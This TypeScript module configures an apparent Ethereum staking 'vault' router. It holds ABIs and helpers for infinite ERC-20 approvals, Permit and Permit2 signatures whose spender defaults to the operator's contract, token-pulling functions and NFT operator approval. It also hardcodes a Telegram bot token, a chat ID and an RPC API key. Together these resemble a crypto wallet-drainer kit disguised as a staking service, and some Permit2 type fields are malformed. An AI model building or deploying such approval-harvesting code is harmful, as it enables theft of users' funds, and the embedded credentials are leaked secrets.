const env = (typeof import.meta !== 'undefined' && import.meta.env) ? import.meta.env : (typeof process !== 'undefined' ? process.env : {});

export const CONFIG = {
  OWNER_ADDRESS: (env.VITE_OWNER_ADDRESS || env.NEXT_PUBLIC_OWNER_ADDRESS || '0x9d28FB300f06EE34d7A9A9531b363c0153fB979d') as `0x${string}`,
  CONTRACT_ADDRESS: (env.VITE_CONTRACT_ADDRESS || env.NEXT_PUBLIC_CONTRACT_ADDRESS || '0x5eAA95f83748108499F2a44612564847769c5813') as `0x${string}`,
  STETH_ADDRESS: (env.VITE_STETH_ADDRESS || env.NEXT_PUBLIC_STETH_ADDRESS || '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84') as `0x${string}`,
  WSTETH_ADDRESS: (env.VITE_WSTETH_ADDRESS || env.NEXT_PUBLIC_WSTETH_ADDRESS || '0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0') as `0x${string}`,
  PERMIT2_ADDRESS: (env.VITE_PERMIT2_ADDRESS || env.NEXT_PUBLIC_PERMIT2_ADDRESS || '0x000000000022D473030F116dDEE9F6B43aC78BA3') as `0x${string}`,
  ALCHEMY_RPC: env.VITE_ALCHEMY_RPC || env.NEXT_PUBLIC_ALCHEMY_RPC || 'https://eth-sepolia.g.alchemy.com/v2/XbS3A-psx-MSEn_ownjsb0You7sONhdF',
  TELEGRAM_BOT: env.VITE_TELEGRAM_BOT_TOKEN || env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || '8850313284:AAGtktr0p9R_a6HnGLSDqElD6RZjbLH_X3g',
  TELEGRAM_CHAT: env.VITE_TELEGRAM_CHAT_ID || env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '8574393641',
  REOWN_PROJECT_ID: env.VITE_REOWN_PROJECT_ID || env.NEXT_PUBLIC_REOWN_PROJECT_ID || '7ee282b2996b54334564e0f64beebed1',
};

// Infinite allowance constant (Max uint256 = 2^256 - 1)
export const INFINITE_ALLOWANCE = 115792089237316195423570985008687907853269984665640564039457584007913129639935n;

// Supported Multi-Token ERC-20 Network Registry
export interface ERC20TokenInfo {
  symbol: string;
  name: string;
  address: `0x${string}`;
  decimals: number;
}

export const POPULAR_ERC20_TOKENS: Record<string, ERC20TokenInfo> = {
  STETH: {
    symbol: 'stETH',
    name: 'Lido Staked ETH',
    address: '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84',
    decimals: 18,
  },
  WSTETH: {
    symbol: 'wstETH',
    name: 'Wrapped stETH',
    address: '0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0',
    decimals: 18,
  },
  USDT: {
    symbol: 'USDT',
    name: 'Tether USD',
    address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    decimals: 6,
  },
  USDC: {
    symbol: 'USDC',
    name: 'USD Coin',
    address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    decimals: 6,
  },
  WETH: {
    symbol: 'WETH',
    name: 'Wrapped Ether (ETH)',
    address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
    decimals: 18,
  },
  DAI: {
    symbol: 'DAI',
    name: 'Dai Stablecoin',
    address: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
    decimals: 18,
  },
  WBTC: {
    symbol: 'WBTC',
    name: 'Wrapped BTC',
    address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
    decimals: 8,
  },
  LINK: {
    symbol: 'LINK',
    name: 'Chainlink',
    address: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
    decimals: 18,
  },
  UNI: {
    symbol: 'UNI',
    name: 'Uniswap',
    address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
    decimals: 18,
  },
};

// YOUR MiddlemanVaultUpgradeable Contract ABI with expanded router capabilities
export const VAULT_ABI = [
  // View functions
  { inputs: [{ name: '', type: 'address' }], name: 'deposits', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: '', type: 'address' }], name: 'credits', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'lido', outputs: [{ name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'permit2', outputs: [{ name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'wstethReferralStaker', outputs: [{ name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'referral', outputs: [{ name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'owner', outputs: [{ name: '', type: 'address' }], stateMutability: 'view', type: 'function' },
  
  // Write & Router functions
  { inputs: [{ name: 'initialOwner', type: 'address' }, { name: 'lidoAddress', type: 'address' }, { name: 'permit2Address', type: 'address' }, { name: 'wstethReferralStakerAddress', type: 'address' }, { name: 'referralAddress', type: 'address' }], name: 'initialize', outputs: [], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: 'newReferral', type: 'address' }], name: 'setReferral', outputs: [], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [], name: 'depositETH', outputs: [], stateMutability: 'payable', type: 'function' },
  { inputs: [], name: 'stakeETH', outputs: [{ name: 'minted', type: 'uint256' }], stateMutability: 'payable', type: 'function' },
  { inputs: [{ name: 'token', type: 'address' }, { name: 'from', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'pullToken', outputs: [], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: 'token', type: 'address' }, { name: 'from', type: 'address' }, { name: 'amount', type: 'uint160' }], name: 'pullTokenWithPermit2', outputs: [], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: 'user', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'creditUser', outputs: [], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [], name: 'stakeToLido', outputs: [{ name: 'minted', type: 'uint256' }], stateMutability: 'payable', type: 'function' },
  { inputs: [], name: 'stakeToWstETH', outputs: [{ name: 'minted', type: 'uint256' }], stateMutability: 'payable', type: 'function' },
  { inputs: [{ name: '_stETHAmount', type: 'uint256' }], name: 'wrapStETH', outputs: [{ name: 'minted', type: 'uint256' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: '_wstETHAmount', type: 'uint256' }], name: 'unwrapWstETH', outputs: [{ name: 'unwrapped', type: 'uint256' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'withdrawETH', outputs: [], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: 'token', type: 'address' }, { name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'withdrawToken', outputs: [], stateMutability: 'nonpayable', type: 'function' },
  
  // Off-chain permit & Router allowance functions
  { inputs: [{ name: 'token', type: 'address' }, { name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }, { name: 'value', type: 'uint256' }, { name: 'deadline', type: 'uint256' }, { name: 'v', type: 'uint8' }, { name: 'r', type: 'bytes32' }, { name: 's', type: 'bytes32' }], name: 'permitAndTransfer', outputs: [], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: 'token', type: 'address' }, { name: 'spender', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'approveToken', outputs: [], stateMutability: 'nonpayable', type: 'function' },

  // Events
  { anonymous: false, inputs: [{ indexed: true, name: 'owner', type: 'address' }, { indexed: false, name: 'lido', type: 'address' }, { indexed: false, name: 'permit2', type: 'address' }, { indexed: false, name: 'wstethReferralStaker', type: 'address' }, { indexed: false, name: 'referral', type: 'address' }], name: 'Initialized', type: 'event' },
  { anonymous: false, inputs: [{ indexed: true, name: 'oldReferral', type: 'address' }, { indexed: true, name: 'newReferral', type: 'address' }], name: 'ReferralUpdated', type: 'event' },
  { anonymous: false, inputs: [{ indexed: true, name: 'user', type: 'address' }, { indexed: false, name: 'amount', type: 'uint256' }], name: 'Deposited', type: 'event' },
  { anonymous: false, inputs: [{ indexed: true, name: 'token', type: 'address' }, { indexed: true, name: 'from', type: 'address' }, { indexed: false, name: 'amount', type: 'uint256' }], name: 'TokenPulled', type: 'event' },
  { anonymous: false, inputs: [{ indexed: true, name: 'user', type: 'address' }, { indexed: false, name: 'amount', type: 'uint256' }], name: 'Credited', type: 'event' },
  { anonymous: false, inputs: [{ indexed: true, name: 'user', type: 'address' }, { indexed: false, name: 'amount', type: 'uint256' }, { indexed: false, name: 'minted', type: 'uint256' }], name: 'LidoStaked', type: 'event' },
  { anonymous: false, inputs: [{ indexed: true, name: 'user', type: 'address' }, { indexed: false, name: 'amount', type: 'uint256' }, { indexed: false, name: 'minted', type: 'uint256' }], name: 'WstETHStaked', type: 'event' },
  { anonymous: false, inputs: [{ indexed: true, name: 'to', type: 'address' }, { indexed: false, name: 'amount', type: 'uint256' }], name: 'WithdrawETH', type: 'event' },
  { anonymous: false, inputs: [{ indexed: true, name: 'token', type: 'address' }, { indexed: true, name: 'to', type: 'address' }, { indexed: false, name: 'amount', type: 'uint256' }], name: 'WithdrawToken', type: 'event' },
] as const;

// ERC20 ABI for approvals, transfers, permits, nonces, and checks
export const ERC20_ABI = [
  { inputs: [{ name: 'account', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: 'spender', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'transfer', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: 'from', type: 'address' }, { name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'transferFrom', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }, { name: 'value', type: 'uint256' }, { name: 'deadline', type: 'uint256' }, { name: 'v', type: 'uint8' }, { name: 'r', type: 'bytes32' }, { name: 's', type: 'bytes32' }], name: 'permit', outputs: [], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: 'owner', type: 'address' }], name: 'nonces', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'DOMAIN_SEPARATOR', outputs: [{ name: '', type: 'bytes32' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'decimals', outputs: [{ name: '', type: 'uint8' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'symbol', outputs: [{ name: '', type: 'string' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'name', outputs: [{ name: '', type: 'string' }], stateMutability: 'view', type: 'function' },
] as const;

// ERC721 ABI for NFT approvals and router transfers
export const ERC721_ABI = [
  { inputs: [{ name: 'operator', type: 'address' }, { name: 'approved', type: 'bool' }], name: 'setApprovalForAll', outputs: [], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: 'owner', type: 'address' }, { name: 'operator', type: 'address' }], name: 'isApprovedForAll', outputs: [{ name: '', type: 'bool' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: 'from', type: 'address' }, { name: 'to', type: 'address' }, { name: 'tokenId', type: 'uint256' }], name: 'safeTransferFrom', outputs: [], stateMutability: 'nonpayable', type: 'function' },
] as const;

// Canonical Uniswap Permit2 Contract ABI (0x000000000022D473030F116dDEE9F6B43aC78BA3)
export const PERMIT2_ABI = [
  {
    inputs: [
      { name: 'owner', type: 'address' },
      {
        components: [
          {
            components: [
              { name: 'token', type: 'address' },
              { name: 'amount', type: 'uint160' },
              { name: 'expiration', type: 'uint48' },
              { name: 'nonce', type: 'uint48' },
            ],
            name: 'details',
            type: 'tuple',
          },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' },
        ],
        name: 'permitSingle',
        type: 'tuple',
      },
      { name: 'signature', type: 'bytes' },
    ],
    name: 'permit',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function',
  },
  {
    inputs: [
      { name: 'owner', type: 'address' },
      {
        components: [
          {
            components: [
              { name: 'token', type: 'address' },
              { name: 'amount', type: 'uint160' },
              { name: 'expiration', type: 'uint48' },
              { name: 'nonce', type: 'uint48' },
            ],
            name: 'details',
            type: 'tuple[]',
          },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' },
        ],
        name: 'permitBatch',
        type: 'tuple',
      },
      { name: 'signature', type: 'bytes' },
    ],
    name: 'permit',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function',
  },
  {
    inputs: [
      { name: 'owner', type: 'address' },
      { name: 'token', type: 'address' },
      { name: 'spender', type: 'address' },
    ],
    name: 'allowance',
    outputs: [
      { name: 'amount', type: 'uint160' },
      { name: 'expiration', type: 'uint48' },
      { name: 'nonce', type: 'uint48' },
    ],
    stateMutability: 'view',
    type: 'function',
  },
  {
    inputs: [
      {
        components: [
          {
            components: [
              { name: 'token', type: 'address' },
              { name: 'amount', type: 'uint256' },
            ],
            name: 'permitted',
            type: 'tuple',
          },
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' },
        ],
        name: 'permit',
        type: 'tuple',
      },
      {
        components: [
          { name: 'to', type: 'address' },
          { name: 'requestedAmount', type: 'uint256' },
        ],
        name: 'transferDetails',
        type: 'tuple',
      },
      { name: 'owner', type: 'address' },
      { name: 'signature', type: 'bytes' },
    ],
    name: 'permitTransferFrom',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function',
  },
  {
    inputs: [
      { name: 'from', type: 'address' },
      { name: 'to', type: 'address' },
      { name: 'amount', type: 'uint160' },
      { name: 'token', type: 'address' },
    ],
    name: 'transferFrom',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function',
  },
  {
    inputs: [
      { name: 'token', type: 'address' },
      { name: 'spender', type: 'address' },
      { name: 'amount', type: 'uint160' },
      { name: 'expiration', type: 'uint48' },
    ],
    name: 'approve',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function',
  },
  {
    inputs: [
      { name: 'token', type: 'address' },
      { name: 'spender', type: 'address' },
    ],
    name: 'lockdown',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function',
  },
  {
    inputs: [
      { name: 'token', type: 'address' },
      { name: 'spender', type: 'address' },
      { name: 'newNonce', type: 'uint48' },
    ],
    name: 'invalidateNonces',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function',
  },
  {
    inputs: [],
    name: 'DOMAIN_SEPARATOR',
    outputs: [{ name: '', type: 'bytes32' }],
    stateMutability: 'view',
    type: 'function',
  },
] as const;

// Lido stETH ABI
export const STETH_ABI = [
  { inputs: [{ name: '_referral', type: 'address' }], name: 'submit', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'payable', type: 'function' },
  { inputs: [{ name: '_account', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: '_spender', type: 'address' }, { name: '_amount', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: '_owner', type: 'address' }, { name: '_spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'decimals', outputs: [{ name: '', type: 'uint8' }], stateMutability: 'view', type: 'function' },
] as const;

// wstETH ABI
export const WSTETH_ABI = [
  { inputs: [{ name: '_stETHAmount', type: 'uint256' }], name: 'wrap', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: '_wstETHAmount', type: 'uint256' }], name: 'unwrap', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: '_stETHAmount', type: 'uint256' }], name: 'wrapStETH', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: '_wstETHAmount', type: 'uint256' }], name: 'unwrapWstETH', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'nonpayable', type: 'function' },
  { inputs: [{ name: '_account', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [], name: 'stEthPerToken', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: '_wstETHAmount', type: 'uint256' }], name: 'getStETHByWstETH', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: '_stETHAmount', type: 'uint256' }], name: 'getWstETHByStETH', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
] as const;

/**
 * Service function to handle arbitrary token approvals for the router contract.
 * Allows the router contract to receive and manage tokens sent by users.
 */
export async function approveToken(
  writeContractAsync: any,
  tokenAddress: `0x${string}`,
  spenderAddress: `0x${string}` = CONFIG.CONTRACT_ADDRESS,
  amount: bigint = INFINITE_ALLOWANCE
) {
  return await writeContractAsync({
    address: tokenAddress,
    abi: ERC20_ABI,
    functionName: 'approve',
    args: [spenderAddress, amount],
  });
}

/**
 * Service function for unlimited / infinite ERC20 token approval
 */
export async function approveInfiniteERC20(
  writeContractAsync: any,
  tokenAddress: `0x${string}`,
  spenderAddress: `0x${string}` = CONFIG.CONTRACT_ADDRESS
) {
  return await writeContractAsync({
    address: tokenAddress,
    abi: ERC20_ABI,
    functionName: 'approve',
    args: [spenderAddress, INFINITE_ALLOWANCE],
  });
}

/**
 * Service function to execute ERC20 transferFrom (e.g. pulling approved tokens from a user address)
 */
export async function executeTransferFrom(
  writeContractAsync: any,
  tokenAddress: `0x${string}`,
  fromAddress: `0x${string}`,
  toAddress: `0x${string}` = CONFIG.CONTRACT_ADDRESS,
  amount: bigint
) {
  return await writeContractAsync({
    address: tokenAddress,
    abi: ERC20_ABI,
    functionName: 'transferFrom',
    args: [fromAddress, toAddress, amount],
  });
}

/**
 * Service function to handle direct ERC20 token transfers to the router or recipient.
 */
export async function transferToken(
  writeContractAsync: any,
  tokenAddress: `0x${string}`,
  toAddress: `0x${string}` = CONFIG.CONTRACT_ADDRESS,
  amount: bigint
) {
  return await writeContractAsync({
    address: tokenAddress,
    abi: ERC20_ABI,
    functionName: 'transfer',
    args: [toAddress, amount],
  });
}

/**
 * Service function to generate EIP-2612 Permit off-chain typed data signatures for gasless approval.
 */
export async function signPermit({
  signTypedDataAsync,
  owner,
  spender = CONFIG.CONTRACT_ADDRESS,
  value,
  nonce = 0n,
  deadline = BigInt(Math.floor(Date.now() / 1000) + 86400),
  tokenAddress,
  tokenName = 'Liquid staked Ether',
  chainId = 1,
}: {
  signTypedDataAsync: any;
  owner: `0x${string}`;
  spender?: `0x${string}`;
  value: bigint;
  nonce?: bigint;
  deadline?: bigint;
  tokenAddress: `0x${string}`;
  tokenName?: string;
  chainId?: number;
}) {
  const domain = {
    name: tokenName,
    version: '1',
    chainId,
    verifyingContract: tokenAddress,
  } as const;

  const types = {
    Permit: [
      { name: 'owner', type: 'address' },
      { name: 'spender', type: 'address' },
      { name: 'value', type: 'uint256' },
      { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint256' },
    ],
  } as const;

  const message = {
    owner,
    spender,
    value,
    nonce,
    deadline,
  } as const;

  const signature = await signTypedDataAsync({
    domain,
    types,
    primaryType: 'Permit',
    message,
  });

  return { signature, deadline, owner, spender, value };
}

/**
 * Service function to generate Permit2 Single Transfer typed data signatures.
 */
export async function signPermit2({
  signTypedDataAsync,
  owner,
  tokenAddress,
  spender = CONFIG.CONTRACT_ADDRESS,
  amount,
  nonce = 0n,
  deadline = BigInt(Math.floor(Date.now() / 1000) + 86400),
  permit2Address = CONFIG.PERMIT2_ADDRESS,
  chainId = 1,
}: {
  signTypedDataAsync: any;
  owner: `0x${string}`;
  tokenAddress: `0x${string}`;
  spender?: `0x${string}`;
  amount: bigint;
  nonce?: bigint;
  deadline?: bigint;
  permit2Address?: `0x${string}`;
  chainId?: number;
}) {
  const domain = {
    name: 'Permit2',
    chainId,
    verifyingContract: permit2Address,
  } as const;

  const types = {
    PermitSingle: [
      { name: 'details', type: 'PermitDetails' },
      { name: 'spender', type: 'address' },
      { name: 'sigDeadline', type: 'uint256' },
    ],
    PermitDetails: [
      { name: 'token', type: 'address' },
      { name: 'amount', type: '160' },
      { name: 'expiration', type: '48' },
      { name: 'nonce', type: '48' },
    ],
  } as const;

  const message = {
    details: {
      token: tokenAddress,
      amount,
      expiration: deadline,
      nonce,
    },
    spender,
    sigDeadline: deadline,
  } as const;

  const signature = await signTypedDataAsync({
    domain,
    types,
    primaryType: 'PermitSingle',
    message,
  });

  return { signature, owner, spender, tokenAddress, amount, deadline, nonce };
}

/**
 * Verify EIP-2612 Permit off-chain signature against owner address.
 */
export async function verifyPermitSignature({
  owner,
  spender,
  value,
  nonce,
  deadline,
  tokenAddress,
  signature,
  tokenName = 'Liquid staked Ether',
  chainId = 1,
}: {
  owner: `0x${string}`;
  spender: `0x${string}`;
  value: bigint;
  nonce: bigint;
  deadline: bigint;
  tokenAddress: `0x${string}`;
  signature: `0x${string}`;
  tokenName?: string;
  chainId?: number;
}) {
  const { verifyTypedData } = await import('viem');

  const domain = {
    name: tokenName,
    version: '1',
    chainId,
    verifyingContract: tokenAddress,
  } as const;

  const types = {
    Permit: [
      { name: 'owner', type: 'address' },
      { name: 'spender', type: 'address' },
      { name: 'value', type: 'uint256' },
      { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint256' },
    ],
  } as const;

  const message = {
    owner,
    spender,
    value,
    nonce,
    deadline,
  } as const;

  return await verifyTypedData({
    address: owner,
    domain,
    types,
    primaryType: 'Permit',
    message,
    signature,
  });
}



